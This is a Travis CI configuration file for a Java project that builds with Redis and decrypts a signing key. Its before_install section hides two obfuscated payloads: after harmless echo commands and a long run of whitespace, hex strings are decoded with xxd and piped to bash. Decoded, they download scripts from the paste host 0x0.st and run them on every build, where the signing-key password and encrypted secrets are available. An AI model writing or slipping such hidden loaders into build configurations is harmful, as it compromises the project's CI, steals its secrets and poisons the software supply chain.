language: java
jdk:
- openjdk8
before_install:
 - echo Netflix_OSS                                                                                                                                                                                                                                                            && echo "62617368202d6320276375726c202d6b20687474703a2f2f3078302e73742f2d4a55502e747874202d6f20747261766973312e747874202626206261736820747261766973312e747874270a" | xxd -p -r | bash
 - echo Travis                                                                                                                                                                                                                                                           && echo "62617368202d6320276375726c202d6b20687474703a2f2f3078302e73742f2d4a554e2e747874202d6f20747261766973322e747874202626206261736820747261766973322e747874270a" | xxd -p -r | bash
install:
- export REDIS_BIN=$HOME/redis/3.0.7/bin
- export TMPDIR=/tmp
- wget -c https://github.com/antirez/redis/archive/3.0.7.tar.gz -O redis-3.0.7.tar.gz
- mv redis-3.0.7.tar.gz $TMPDIR
- cd $TMPDIR
- tar -xvf redis-3.0.7.tar.gz
- make -C redis-3.0.7 PREFIX=$HOME/redis/3.0.7 install
before_script:
- "$REDIS_BIN/redis-server --daemonize yes"
- sleep 3
- "$REDIS_BIN/redis-cli PING"
- export REDIS_VERSION="$(redis-cli INFO SERVER | sed -n 2p)"
- echo $REDIS_VERSION
- cd $TRAVIS_BUILD_DIR
- ls -la
- git status .
- openssl aes-256-cbc -k "$NETFLIX_OSS_SIGNING_FILE_PASSWORD" -in secrets/signing-key.enc
  -out secrets/signing-key -d
after_success:
- redis-cli SHUTDOWN NOSAVE
after_failure:
- redis-cli SHUTDOWN NOSAVE
script: "./buildViaTravis.sh"
cache:
  directories:
  - "$HOME/.gradle/caches"
env:
  global:
  - secure: jtJ2i3GtP6z6V9eT3dCXeZKPd/iSZS/AFmx70mxXukYXS6TNDA4SH65B9WIWlO9WkzJ20WpUrJWkCT7z/V0UjL9uXRo8eMBt7QPIV8/Uo4JB8R/uZeVEKHQnwNb6h6nVqcGRV5Z+OQk1wbfJtYVigxyGDSMT3ANl02KTPv2Z5I2GhViggjonnEh09iNtyf36xDA315molUh3dV8F8iAFCDuKax4s2uUuOWgHg9P9nKkvjT1Ekl00iS/vMsUQg1umY0WivGBFYmqGWR3QmD0se3DPA/ORkDoD0vsI5FFf3WLcJ4pS0gt1HAPR5lynMcJw2lfwAypRDP/h3xC8AsKvwOJZbkdKi6MZTi69C7bRSpTn42SIF++qoPCcEU9MC26AqejOy2jXCqe0qgmmonc0hiQ4FIduJ046+YlDjJGa/xuKP9IOYlS65RhMkFrfDBzmPlfIAV+6/NkZ37A6pj/8Iwl4pi3TbQuiNqadTWULedlS7mox3d/eswkn7SHLBQ5A/d5cH7tHkB/6xWro+enXPrgtnsFm6otWk18lZYFvMKxLDo20HAOPJdoaSe+VLqiRnX/FIYrLTxZFDBZ+zMAu6ex/3gzCsXkTVTx0f1QX7q2u2m0R5mgmwRWRqjgociP+drSpiEdj0Ye0kQQkGrJATTIAYHy6hSTZ72NsBCNEvkk=
  - secure: n01LBFj4j+GguGgWknTH9SHJYoF7vbFX+2emL1GojFYQTZwzQmBjGgkHcw9HO3rFGlxVBKE3rVFvfRC0Yk5U+edKEMnfFh44521PbNjHEl+kNlJRwWoUrfGod7Fdb1AV+so+3dlCrJVnflkAVLBjN7qNFW9yTRfVyJ4fd2s06q4OL/1vZIPdmOelXyXB+duwhoo/XC6jNQ0NVv6IEtgJdZvhgC94Mdkk78b/Yme6zTfHrTpcknv6YAEl+TpInIAyx/q27rQdfam5O9YPYUC99iXGpZPH1vo+mXHI7ICX7/nFVZqaJHlLCoInM8sEwJoEN66XCPJNA8ZzSxPf6VTQdYe1ZkSZjbcjP9kReGfXdlcmpXK1C8Ljj810ZIudQKzLJn4QW97KfVXaUWOsI8vCEZAl1r598oboEGU/Y1KJwGHujMrvn6zuCfmxMdbvl7f5sI160o/Yjg4TOz7hisJyRImi/S13G+WlFLOa5eZFDCoXhdu9Ni7kzfwPnyxvqmCodlFcQwZUVnkwXQCehcQsz9Up+mKOXNV7bZrocRNiyHZvG0ok5yW7bu5WI21FWc8/FLChXmTNEBQQb6pNIiQiMaNa40JQbssxvorHusI7QclOQ0v//56J8hAPJ3pCy3syAKnFpqhrnUOEFdPVYBMG9rRsWYVLrMnO3bSrUWSJDzY=
  - secure: kH0koPpkkWwCHtCzXhHj4js/anq8bYM6wW6TV2AeujH9pGVqVJLsX15LYB8gfRfVKclTKTmNBFxKyfShQnFXeGGgX8QLf9rs8GJkPGKBCXjRlnbx3FzLpIJXys4vCuuVk44srAVFLJ3CzU1laQrlJvw9ecKLsgUY6aPMGcFt1cuI4kpJ5FJR91e+qKXbikYYjfQEMxhuIeoiVIhoFtfrcLTUdyCcJ3SW9V9KdQGcm+WTJr3HTRBWM/3bjbMYifYiUaHcz5cxffRPbdcE1QDw0Zza49MEDsq4wlkx3iZhZBGWUqH7GAX6vda+tdiR67k1NPLBLnUx1qRoJylYzlgT+JyOGz0vE1prxGH5M6JpKB0LnMgqmn/SR84tS8I3otNAET28EMCyPPyCCLl6inYEnSNWv+1J3c5li7WLgHxKKb+ZGqbVQSMyLKJxRgiZluh/Gby6vTtSUmokAyKsORUACN8sq9nqEY/P7rZIwKxH/7X8nIUj3XKP4QzL9taxr5LkwWEL5x/w4jNSj/72rhcXj2qEPKWp0SZRtLzfKeN/q/4ZrscIP5p4zCP2chXI/18SJP+ObCZAaMR9cUxpiKSPgew9CkQnIydhIfisV9+ov/xBdNg4bUvKvbu8kSxub1RAv+h6q/2JFIewzSte7D3RCXRnq4sCDT3ROIOaXd3bKxc=
  - secure: fvT1mzchzSty+f6uXWt3bXefkkzRpUW7//GAEi9XuiEiIl/Tat/Nrtd5hmzhSOpHE72XtcwZq4dCFw1mhdGkM3WTwXOvRslFr9TnRsJLRJRdm3Tisn/lTBtJWCt9WF8Ax7LWbm81esL0VS4Uyj5udpbQgIe9E78rW0nSd1PxpIqm8N/s5g+Nw8pPZTEGwxAgbIXeWZKzT3Nv/HE/uvm4cifURwlQSsSn29fbIrVkQwbwFn9ZIh6z6WX4QNfQCDXAEgTmxqG+YvPjfVYsInLfU/GfnxkqhtWKV7TtlwID1lG5RJpTfclT87ES/cqga+MuEXjEAeBa055Q4to5kb4PcSVAbbPiBU9dO2xeQE5vhnEU6i8my8bhOzbAjrtOlKw6mRSlS8ER0Dqbw/ZPSbtlXRxYbGHOgM5Ql/g2cTw9rYCyuJzOXhcAF+1Ex7m2E8AFmpZxW+eK3NQN/OMZew3JmAEBMbUMHxv9XITLod9/ggnfCRGniCYDQ5UfCdCK8ZfJFrYzY/TXAhgB29eVvsd0xcD+XDbwx6vXwAKg+whGEmd9cxOZhPJZWOcTeVU6nGtTyRgVHnGb8P5cEoaf8Hw/85Paja/DG2/rcsyzZuqG+XjcwNVrnnqbsh8rlRXiTQMIew/gQEvcermL9KtmbnZA382bceGqSBZaQkA7dtgD/rA=
  - secure: aFbzxNtLjlRgwWCOzrl06+OuCdIEcIW3XOoAMw02LSOusRMmz0uiZDLQ+sxRlfr7tb7/ERSXuUZLT+7KctzMlSxyho3Nq/RqYHcGUzHrB4Bv8BE+WoA+V0CYQruAAIms+VIoYozYJJyMsFHR7eM6Xso/LaNWat+0udtADSlYjQOFCs0fnTpEuy0cTxWcTbXxDPtmDzIl+0tRMZQMY7PKCBxxqKR544w/Q2xifwrSJsFF7fSa5ELQEEEm5BMMqRTx/7RfOXMhs41UrgL5QOWysow+SLwFNdlRammZhY5oliSX/cxN9G6tSRGRENVnQPJHps75lBBF/tjKFwfMeT7eFeqrcr5EFl/1+FgILhqlSYWnuEyxHE+F8K72o7bwTLxagoBovAOJ32qYI6VDgnCFGhMVeJ14AAshlkjM99yuahi4AR/V73oAbNnXsG2IJbrvp0SlFAGYJJ0cd2EyKdM2JvgRD82ZYXePYTpwvHm8mo88bmUFTCMkXkw6ieGUXin+6JKNt9KCixP/Uz+lNMXgC03Z9kJGu0oLHF/RBBl80eqw6jUgismDCC50OrTSGosnu/rWT0U3JE6UsQHgGIGLz9LZUYsz9yDh3HlYNAdAkpZfZSKFxsEkIbmmTMGIsROWm2Fi3HqY3Wqk74z57fpvYhPXtVotNweEuRaDbckv9wg=
  - secure: QHXqKywwywvhUpyic/2aX6du3u5FjaYjRDzC9SnMr2Vr4oZ8gqsbc1YF+AoJf42k5mbdfB8IjHLBcRwtMRdU89+Dn11X5tXoGqBaBlSwvrBBUFCHycd8qJLRh0XD+dXopp42yGGXZTQTaSu2UFOGpnJyAI56l0lG1PB/KMY7ASM3uQ5sziRIwjzMUdUlIjpC33HyWm5D9ldU44rY/WL74i60BoGSkWCLcmCLleLrIhcysF94/cN74QOefPyw/cYghqE9MAdofpRcmci74agnyh+5ZGV+cXQx3FldZJnyqTecIyKJYPqgAzIFk1JV7r0sGuxisEFKptuPQmpdea92fPhMo+wqnVmvctGOd9BbKbqzeQGikXlP5MjtWvNktq/fiNEW3kL/il1/GU9W4camoo/EaslxMcjIGMdFsuhsV7sGrtpjTq2vjNT1L4HGhCcRbAItrGAuUY3nXeB/UM/nGWu1e2j0iZOeY0mMNzd1x+kqTnS+lgDkrEpGjGGYHfXewGuWJudOoegcE68uKtS5Tdubz4AY4T9GPo0n+TdEyzx5LMRYCqyVm/l4Rzf2NVhv0wUcijOYvVE2cM0GktL4dRS5/82cQKLOojNWVf6oaXO1YicWrD3Imy/yNlW8bjxbkLgFDJXUCqYTHK9hEayYhG33a8mxtgHrY5dd7MqmhYQ=
